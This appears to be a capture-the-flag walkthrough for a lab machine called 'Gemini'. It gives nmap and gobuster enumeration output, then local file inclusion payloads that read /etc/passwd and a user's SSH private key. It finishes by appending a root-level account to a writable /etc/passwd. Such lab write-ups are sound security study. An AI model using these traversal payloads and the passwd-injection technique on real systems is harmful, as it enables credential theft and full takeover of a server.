<pre>
Edit host file:
$ vi /etc/hosts
    192.168.1.132        geminicorp.com

Enum:
    Open ports:
        21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a3:38:0e:b6:a1:b8:49:b1:31:a0:43:3e:61:c3:26:37 (RSA)
|   256 fc:40:6c:0b:7b:f0:03:6e:2e:ef:2d:60:b5:96:01:b6 (ECDSA)
|_  256 90:ed:89:27:9d:65:ea:80:54:79:65:af:2c:d7:80:43 (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Gemini Corp
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:93:9F:70 (Oracle VirtualBox virtual NIC)
Service Info: Host: GEMINI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -20m00s, deviation: 34m38s, median: 0s
|_nbstat: NetBIOS name: GEMINI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: gemini
|   NetBIOS computer name: GEMINI\x00
|   Domain name: \x00
|   FQDN: gemini
|_  System time: 2020-11-17T11:12:03+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-11-17T10:12:03
|_  start_date: N/A

Port 80 enum: gobuster
    /images (Status: 301)
/assets (Status: 301)
/Portal (Status: 301)
    /index.php (Status: 200)
/contact-us.html (Status: 200)
/about-us.html (Status: 200) 
server-status (Status: 403)


/about-us.html (Status: 200) -> Vuln page
From LFI vuln to code execution
http://geminicorp.com/Portal/index.php?view=about-us.html
http://geminicorp.com/Portal/index.php?view=about-us.html/../../../../../../etc/passwd

Get ssh rsa key for login to ssh:
http://geminicorp.com/Portal/index.php?view=about-us.html/../../../../../../home/william/.ssh/id_rsa

Copy in attack box in id_rsa:
    $ chmod 400 id_rsa
    $ ssh -i id_rsa william@geminicorp.com
    *And got ssh connection and got user flag!

Priv esc enum:
/etc/passwd -> weak and can modify by others

    Lets make new user:
        $ openssl passwd -1 -salt arnav pass123 
            Result: $1$arnav$o8F/YObXhnuM67NCy.3fk1

    arnav:$1$arnav$o8F/YObXhnuM67NCy.3fk1:0:0:/root/root:/bin/bash
        $ nano /etc/passwd
        Add arnav:$1$arnav$o8F/YObXhnuM67NCy.3fk1:0:0:/root/root:/bin/bash at the end of file
        $ su arnav
        $ pass123

        And got root! :D




User Flag: srLbBhLRK7nBdZAesnxyeWaMV
Root Flag: vD1JA8mze74XzkmzOA21R4sjZ
</pre>
